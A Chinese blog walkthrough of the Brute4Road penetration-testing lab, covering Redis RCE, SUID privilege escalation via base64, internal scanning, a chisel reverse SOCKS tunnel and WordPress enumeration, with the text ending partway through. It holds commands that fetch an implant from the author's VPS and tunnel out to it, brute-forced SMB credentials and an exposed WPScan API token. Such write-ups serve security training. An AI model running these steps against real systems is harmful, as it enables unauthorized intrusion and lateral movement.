---
title: "春秋云境-Brute4Road"
description: "Brute4Road是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。"
date: 2025-07-29
tags:
  - "春秋云境"
  - "Brute4Road"
  - "域渗透"
  - "代理转发"
authors:
  - "bx"
draft: false              # 设为 true 则为草稿
slug: "brute4road"          # 随机URL字符串
---
<meta name="referrer" content="no-referrer">

# 春秋云境-Brute4Road
![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753933553215-3ca4c6bc-9d39-42f0-bcc7-e9cf6a8f76c4.png)

:::info
一共有四个 flag

_**靶标介绍：**_

Brute4Road是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。



为了深度学习，这个写的详细一点

:::

拿到靶机--->`39.99.226.232`，fscan 直接开始看一看

```bash
❯ ./fscan -h 39.99.226.232
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[717ms]     已选择服务扫描模式
[717ms]     开始信息扫描
[717ms]     最终有效主机数量: 1
[717ms]     开始主机扫描
[718ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[718ms]     有效端口数量: 233
[766ms] [*] 端口开放 39.99.226.232:6379
[772ms] [*] 端口开放 39.99.226.232:22
[772ms] [*] 端口开放 39.99.226.232:21
[3.7s]     扫描完成, 发现 3 个开放端口
[3.7s]     存活端口数量: 3
[3.7s]     开始漏洞扫描
[4.0s] [+] FTP服务 39.99.226.232:21 匿名登录成功!
[6.8s] [+] Redis 39.99.226.232:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb
[6.8s] [+] Redis无密码连接成功: 39.99.226.232:6379
[6.8s]     扫描已完成: 3/3
```

可以发现存在一个

1. ftp 服务，匿名登录

这里登录进去没有什么东西



2. redis 漏洞

我们利用

了解到这个工具

[GitHub - n0b0dyCN/redis-rogue-server: Redis(<=5.0.5) RCE](https://github.com/n0b0dyCN/redis-rogue-server)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753939010368-8de66132-4603-4974-99cf-0b872c05a031.png)

可以直接 RCE 拿到 shell

稍微升级到半终端

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

这里利用 python 服务，直接上传 suupershell 的马

```bash
python3 -m http.server 2000
wget http://43.134.9.57:2000/11 -O /tmp
```

连上来，找一找 flag 位置

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753931297536-742a83f2-e5cf-4706-9b3a-354176764b05.png)

没有权限，需要提权

找到这个`SUID`提权

```bash
sh-4.2$ find / -user root -perm -4000 -print 2> result.txt
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/sbin/unix_chkpwd
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chage
/usr/bin/base64
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/crontab
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/pkexec
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
```

[base64 | GTFOBins](https://gtfobins.github.io/gtfobins/base64/)

具体利用如下

```bash
sudo install -m =xs $(which base64) .

LFILE=file_to_read
./base64 "$LFILE" | base64 --decode
```

利用 suid 提权

```bash
base64 "/home/redis/flag/flag01" | base64 --decode
```

拿下第一个 flag

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753931428625-34a3eceb-f72a-44e0-9e88-4cba0209977a.png)





继续内网渗透

查看一下 ip

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753931565536-812a0165-549a-4216-9512-c80549a2fb90.png)

上传 fscan，扫描结果如下

```bash
sh-4.2$ ./FScan_2.0.1_linux_x64 -h 172.22.2.0/24
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[1.9s]     已选择服务扫描模式
[1.9s]     开始信息扫描
[1.9s]     CIDR范围: 172.22.2.0-172.22.2.255
[1.9s]     generate_ip_range_full
[1.9s]     解析CIDR 172.22.2.0/24 -> IP范围 172.22.2.0-172.22.2.255
[1.9s]     最终有效主机数量: 256
[1.9s]     开始主机扫描
[1.9s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[1.9s]     正在尝试无监听ICMP探测...
[1.9s]     ICMP连接失败: dial ip4:icmp 127.0.0.1: socket: operation not permitted
[1.9s]     当前用户权限不足,无法发送ICMP包
[1.9s]     切换为PING方式探测...
[2.9s] [*] 目标 172.22.2.16     存活 (ICMP)
[3.0s] [*] 目标 172.22.2.18     存活 (ICMP)
[5.0s] [*] 目标 172.22.2.3      存活 (ICMP)
[5.0s] [*] 目标 172.22.2.34     存活 (ICMP)
[6.0s] [*] 目标 172.22.2.7      存活 (ICMP)
[7.9s]     存活主机数量: 5
[7.9s]     有效端口数量: 233
[7.9s] [*] 端口开放 172.22.2.16:135
[7.9s] [*] 端口开放 172.22.2.16:139
[7.9s] [*] 端口开放 172.22.2.16:80
[7.9s] [*] 端口开放 172.22.2.3:445
[7.9s] [*] 端口开放 172.22.2.3:389
[7.9s] [*] 端口开放 172.22.2.3:135
[7.9s] [*] 端口开放 172.22.2.3:139
[7.9s] [*] 端口开放 172.22.2.3:88
[7.9s] [*] 端口开放 172.22.2.16:1433
[7.9s] [*] 端口开放 172.22.2.18:80
[7.9s] [*] 端口开放 172.22.2.18:22
[7.9s] [*] 端口开放 172.22.2.16:445
[7.9s] [*] 端口开放 172.22.2.18:445
[7.9s] [*] 端口开放 172.22.2.18:139
[7.9s] [*] 端口开放 172.22.2.34:135
[7.9s] [*] 端口开放 172.22.2.34:445
[7.9s] [*] 端口开放 172.22.2.34:139
[7.9s] [*] 端口开放 172.22.2.7:80
[7.9s] [*] 端口开放 172.22.2.7:22
[7.9s] [*] 端口开放 172.22.2.7:21
[7.9s] [*] 端口开放 172.22.2.7:6379
[10.9s]     扫描完成, 发现 21 个开放端口
[10.9s]     存活端口数量: 21
[10.9s]     开始漏洞扫描
[11.0s] [*] NetInfo 扫描结果
目标主机: 172.22.2.16
主机名: MSSQLSERVER
发现的网络接口:
   IPv4地址:
      └─ 172.22.2.16
[11.0s] [*] NetInfo 扫描结果
目标主机: 172.22.2.3
主机名: DC
发现的网络接口:
   IPv4地址:
      └─ 172.22.2.3
[11.0s] [*] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found
[11.0s] [*] NetInfo 扫描结果
目标主机: 172.22.2.34
主机名: CLIENT01
发现的网络接口:
   IPv4地址:
      └─ 172.22.2.34
[11.0s]     系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]
[11.0s] [+] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393
[11.0s]     系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]
[11.0s] [*] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS
[11.1s] [+] NetBios 172.22.2.34     XIAORANG\CLIENT01             
[11.1s] [+] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable
[11.1s]     POC加载完成: 总共387个，成功387个，失败0个
[11.1s] [+] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393
[11.1s] [+] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        
[11.2s] [+] FTP服务 172.22.2.7:21 匿名登录成功!
[11.3s] [+] SMB认证成功 172.22.2.18:445 administrator:admin123
[11.5s]     SMB2共享信息 172.22.2.18:445 administrator Pass:P@ssword123 共享:[print$ IPC$]
[11.5s] [+] SMB认证成功 172.22.2.16:445 admin:admin123
[11.5s]     SMB2共享信息 172.22.2.18:445 administrator Pass:pass@123 共享:[print$ IPC$]
[11.6s]     SMB2共享信息 172.22.2.18:445 administrator Pass:pass123 共享:[print$ IPC$]
[11.6s]     SMB2共享信息 172.22.2.18:445 administrator Pass:root 共享:[print$ IPC$]
[11.7s]     SMB2共享信息 172.22.2.18:445 administrator Pass:Password 共享:[print$ IPC$]
[11.7s]     SMB2共享信息 172.22.2.18:445 administrator Pass:admin 共享:[print$ IPC$]
[11.8s]     SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[print$ IPC$]
[11.8s]     SMB2共享信息 172.22.2.18:445 administrator Pass:admin123 共享:[print$ IPC$]
[11.8s]     SMB2共享信息 172.22.2.18:445 administrator Pass: 共享:[print$ IPC$]
[11.8s]     SMB2共享信息 172.22.2.18:445 administrator Pass:password 共享:[print$ IPC$]
[12.1s]     SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]
[12.1s]     SMB2共享信息 172.22.2.16:445 admin Pass:admin123 共享:[ADMIN$ C$ fileshare IPC$]
[12.1s]     SMB2共享信息 172.22.2.16:445 admin Pass:root 共享:[ADMIN$ C$ fileshare IPC$]
[12.2s]     SMB2共享信息 172.22.2.16:445 admin Pass: 共享:[ADMIN$ C$ fileshare IPC$]
[15.4s] [*] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点
[55.5s]     扫描已完成: 37/37

```

存活五台机子

```bash
172.22.2.3	DC	Windows Server 2016 Datacenter 14393
172.22.2.16	MSSQLSERVER	Windows Server 2016 Datacenter 14393
172.22.2.34	CLIENT01	Windows 客户端，NetBios: XIAORANG\CLIENT01
172.22.2.18	UBUNTU-WEB02	Linux 主机，运行 WordPress
172.22.2.7	未命名	CentOS，开启 FTP 匿名访问
```

我们当前在 .7 机子，

搭建代理隧道

```bash
# server 在我vps上
./chisel server -p 8000 --reverse


# client
./chisel client 43.134.9.57:8000 R:0.0.0.0:1080:socks
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753932424913-94934611-994c-46bd-8eba-733302d9fa3e.png)

在 Windows 利用 Proxyifier 建立隧道

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753945157001-7f6d57ed-d382-408e-8593-52760cb01580.png)

先从 Wordpress ---web 站开始

访问[http://172.22.2.18/](http://172.22.2.18/) 检测代理效果

> 一个 WordPress 站，
>

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753932396225-c5598a1f-6c30-45a7-9fdd-03be0e17f178.png)

Kail 上一下代理

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753939440186-d6857872-62a1-422e-be3a-72fe57242040.png)

用 WPscan 扫一下

```bash
proxychains4 wpscan --url http://172.22.2.18/ --api-token
```

扫描结果如下

```bash
┌──(root㉿kali)-[/mnt/hgfs/shared]
└─# proxychains4 wpscan --url http://172.22.2.18/ --api-token ba4cRMPJWGOg65GtEJZ5F780PRttT3o9sd8CABdBq7U
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[proxychains] Strict chain  ...  43.134.9.57:1080  ...  172.22.2.18:80  ...  OK
[proxychains] Strict chain  ...  43.134.9.57:1080  ...  wpscan.com:443  ...  OK
[+] URL: http://172.22.2.18/ [172.22.2.18]
[+] Started: Thu Jul 31 13:24:54 2025

[proxychains] Strict chain  ...  43.134.9.57:1080  ...  172.22.2.18:80  ...  OK
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.22.2.18/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.22.2.18/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.22.2.18/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.22.2.18/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.22.2.18/index.php/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://172.22.2.18/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |
 | [!] 33 vulnerabilities identified:
 |
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     Fixed in: 6.0.2
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 6.0.2
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     Fixed in: 6.0.2
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
 |
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     Fixed in: 6.0.4
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
 |     Fixed in: 6.0.4
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     Fixed in: 6.0.4
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     Fixed in: 6.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     Fixed in: 6.0.4
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP 5.6-6.3.1 - Contributor+ Stored XSS via Navigation Block
 |     Fixed in: 6.0.6
 |     References:
 |      - https://wpscan.com/vulnerability/cd130bb3-8d04-4375-a89a-883af131ed3a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38000
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP 5.6-6.3.1 - Reflected XSS via Application Password Requests
 |     Fixed in: 6.0.6
 |     References:
 |      - https://wpscan.com/vulnerability/da1419cc-d821-42d6-b648-bdb3c70d91f2
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
 |     Fixed in: 6.0.6
 |     References:
 |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     Fixed in: 6.0.6
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     Fixed in: 6.0.6
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
 |     Fixed in: 6.0.6
 |     References:
 |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5561
 |      - https://wpscan.com/blog/email-leak-oracle-vulnerability-addressed-in-wordpress-6-3-2/
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 6.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 6.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.5.2 - Unauthenticated Stored XSS
 |     Fixed in: 6.0.8
 |     References:
 |      - https://wpscan.com/vulnerability/1a5c5df1-57ee-4190-a336-b0266962078f
 |      - https://wordpress.org/news/2024/04/wordpress-6-5-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 6.0.9
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 6.0.9
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 6.0.9
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/

[+] WordPress theme in use: twentytwentytwo
 | Location: http://172.22.2.18/wp-content/themes/twentytwentytwo/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://172.22.2.18/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wpcargo
 | Location: http://172.22.2.18/wp-content/plugins/wpcargo/
 | Last Updated: 2025-07-23T01:11:00.000Z
 | [!] The version is out of date, the latest version is 8.0.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: WPCargo < 6.9.0 - Unauthenticated RCE
 |     Fixed in: 6.9.0
 |     References:
 |      - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003
 |
 | [!] Title: WPCargo Track & Trace < 6.9.5 - Reflected Cross Site Scripting
 |     Fixed in: 6.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/d5c6f894-6ad1-46f4-bd77-17ad9234cfc3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1436
 |
 | [!] Title: WPCargo Track & Trace < 6.9.5 - Admin+ Stored Cross Site Scripting
 |     Fixed in: 6.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/ef5aa8a7-23a7-4ce0-bb09-d9c986386114
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1435
 |
 | [!] Title: WPCargo Track & Trace <= 8.0.2 - Unauthenticated SQL Injection
 |     References:
 |      - https://wpscan.com/vulnerability/f5fdb762-cbc1-4352-9ab2-cbba9d3d33e2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44004
 |      - https://patchstack.com/database/wordpress/plugin/wpcargo/vulnerability/wordpress-wpcargo-track-trace-plugin-7-0-6-sql-injection-vulnerability
 |
 | [!] Title: WPCargo Track & Trace <= 8.0.2 - Subscriber+ Settings Update
 |     References:
 |      - https://wpscan.com/vulnerability/b433fff9-b501-4fb3-9f04-5e18b64b0a90
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-54271
 |      - https://patchstack.com/database/wordpress/plugin/wpcargo/vulnerability/wordpress-wpcargo-track-trace-plugin-7-0-6-settings-change-vulnerability
 |
 | [!] Title: WPCargo Track & Trace <= 8.0.2 - Contributor+ Insecure Direct Object Reference
 |     References:
 |      - https://wpscan.com/vulnerability/594ae221-06b6-4bc2-b5b6-0f9bac880f7b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31609
 |      - https://patchstack.com/database/wordpress/plugin/wpcargo/vulnerability/wordpress-wpcargo-track-trace-plugin-7-0-6-insecure-direct-object-references-idor-vulnerability
 |
 | Version: 6.x.x (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
